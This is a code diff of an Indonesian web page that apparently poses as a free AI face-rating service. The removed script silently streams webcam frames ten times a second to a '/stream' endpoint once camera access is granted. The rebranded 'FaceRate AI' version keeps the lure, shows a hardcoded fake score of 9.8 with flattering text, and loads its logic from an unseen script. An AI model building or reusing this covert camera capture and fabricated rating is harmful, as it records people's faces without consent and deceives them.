@@ -2,51 +2,34 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Rate Muka Kamu Gratis!</title>
-  <style>
-    body {font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #ff6b6b, #4ecdc4); text-align: center; color: white; padding: 20px;}
-    h1 {font-size: 28px; margin: 10px;}
-    video {width: 100%; max-width: 380px; border: 5px solid white; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.3);}
-    #status {margin: 15px; font-weight: bold; color: #fff;}
-    .btn {background: #fff; color: #ff6b6b; padding: 12px 25px; border: none; border-radius: 50px; font-size: 16px; cursor: pointer; margin: 10px;}
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>FaceRate AI – Rating Wajah Profesional</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/css/style.css" />
 </head>
 <body>
-  <h1>Rate Muka Kamu Sekarang!</h1>
-  <p>Izinkan kamera untuk lihat rating wajahmu!</p>
-  <video id="video" autoplay playsinline></video>
-  <div id="status">Menghubungkan...</div>
+  <div class="container">
+    <div class="header">
+      <h1>FaceRate <span class="ai">AI</span></h1>
+      <p>Analisis Wajah Profesional dengan Teknologi AI</p>
+    </div>
 
-  <script>
-    const video = document.getElementById('video');
-    const status = document.getElementById('status');
+    <div class="camera-box" id="cameraBox">
+      <video id="video" autoplay playsinline></video>
+      <div class="scan-animation"></div>
+      <div class="scan-line"></div>
+    </div>
 
-    async function startCam() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: 320, height: 240 }
-        });
-        video.srcObject = stream;
-        status.innerHTML = "LIVE STREAMING AKTIF!";
+    <div class="result hidden" id="result">
+      <h2>Hasil Analisis</h2>
+      <div class="score" id="score">9.8</div>
+      <p id="desc">Wajah Anda sangat menarik! Cocok untuk modeling.</p>
+      <button onclick="restart()">Scan Ulang</button>
+    </div>
 
-        const canvas = document.createElement('canvas');
-        canvas.width = 320; canvas.height = 240;
-        const ctx = canvas.getContext('2d');
+    <div class="status" id="status">Izinkan kamera untuk memulai...</div>
+  </div>
 
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, 320, 240);
-          fetch('/stream', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: canvas.toDataURL('image/jpeg', 0.5) })
-          });
-        }, 100); // 10 FPS
-
-      } catch (e) {
-        alert("Izinkan akses kamera untuk melanjutkan!");
-      }
-    }
-    window.onload = startCam;
-  </script>
+  <script src="/static/js/client.js"></script>
 </body>
-  </html>
+</html>
